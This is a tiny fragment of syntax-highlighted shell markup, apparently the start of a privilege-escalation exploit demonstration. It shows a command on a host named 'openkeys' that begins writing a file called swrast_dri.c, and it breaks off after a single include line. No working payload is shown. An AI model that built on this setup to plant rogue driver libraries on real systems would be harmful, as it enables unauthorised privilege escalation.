openkeys<span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> swrast_dri.c <span class="o">&lt;&lt;</span> <span class="sh">"</span><span class="no">EOF</span><span class="sh">"
&gt; #include &lt;paths.h&gt;
